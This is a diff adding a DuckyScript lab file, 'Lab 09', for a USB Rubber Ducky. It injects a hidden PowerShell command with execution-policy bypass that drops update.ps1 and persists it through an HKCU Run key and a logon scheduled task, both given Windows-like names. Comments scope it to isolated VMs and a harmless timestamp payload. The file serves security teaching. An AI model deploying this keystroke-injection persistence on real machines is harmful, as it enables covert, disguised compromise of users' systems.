@@ -1,0 +1,19 @@
+REM ============================================================
+REM Lab 09: Persistence via Registry Run Key + Scheduled Task
+REM Target: Windows 10/11, USB Rubber Ducky (DuckyScript 3.0)
+REM
+REM WARNING: Run only against an isolated, snapshotted VM.
+REM See DuckyLabs/README.md for ground rules.
+REM
+REM Effect: drops a tiny script in %APPDATA%, then persists it TWO
+REM ways - an HKCU Run key and a logon-triggered Scheduled Task.
+REM Neither needs admin rights or triggers a UAC prompt, unlike
+REM Lab 08. The dropped script only appends a timestamp to a file
+REM in %TEMP% - harmless, and fully removed by cleanup.ps1.
+REM ============================================================
+
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "Set-Content -Path \"$env:APPDATA\update.ps1\" -Value 'Add-Content -Path \"$env:TEMP\persistence_ran.txt\" -Value (Get-Date)'; New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsSecurityHealth' -PropertyType String -Value \"powershell -NoP -W Hidden -File $env:APPDATA\update.ps1\" -Force; schtasks /Create /TN \"WindowsUpdateCheck\" /TR \"powershell -NoP -W Hidden -File $env:APPDATA\update.ps1\" /SC ONLOGON /F"
+ENTER
